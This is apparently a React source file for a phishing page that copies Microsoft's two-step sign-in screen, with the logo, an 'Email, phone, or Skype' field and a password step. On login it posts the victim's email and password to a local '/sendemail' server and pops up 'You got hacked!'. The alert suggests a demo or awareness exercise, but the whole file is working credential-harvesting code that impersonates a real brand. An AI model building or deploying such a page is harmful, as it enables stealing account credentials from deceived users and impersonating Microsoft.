import "./assets/app.css";
import logo from "./assets/logo.png"
import {useState} from 'react';
import * as React from "react";
import axios from "axios"


const App = () => {

  const [window, setWindow] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")

  const handleNext = () => {
    setWindow(true)
  }

  const handleEmail = (e) => {
    setEmail(e.target.value)
  }

  const handlePassword = (e) => {
    setPassword(e.target.value)
  }

  function sendEmail(email, password) {
    axios.post("http://localhost:30000/sendemail", {email, password})
      .then(res => console.log(res.data))
  }

  const handleLogin = (e) => {
    sendEmail(email, password)
    alert("You got hacked!")
  }

  return !window ? (
    <div className="App">
      <section id="section_uname">
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" />
          <h2 className="title mb-16 mt-16">Sign in</h2>
          <form>
              <div className="mb-16">
                  <input id="inp_uname" type="email" name="uname" className="input" onChange={handleEmail} value={email} placeholder="Email, phone, or Skype" />
              </div>
          </form>
          
          <div>
              <button className="btn" onClick={handleNext} id="btn_next">Next</button>
          </div>
      </div>
      <div className="opts">
          <p className="has-icon mb-0" style={{fontSize: "15px"}}><span className="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options</p>
      </div>
      </section>

   
    <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    </div>
  ) : (
    <div className="App">
      <section id="section_uname">
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" />
          <h2 className="title mb-16 mt-16">Sign in</h2>
          <form>
              <div className="mb-16">
                  <input id="inp_uname" type="password" name="uname" className="input" onChange={handlePassword} value={password} placeholder="Password" />
              </div>
          </form>
          
          <div>
              <button className="btn" onClick={handleLogin} id="btn_next">Login</button>
          </div>
      </div>
      <div className="opts">
          <p className="has-icon mb-0" style={{fontSize: "15px"}}><span className="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options</p>
      </div>
      </section>

    <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    </div>
  )
}

export default App;
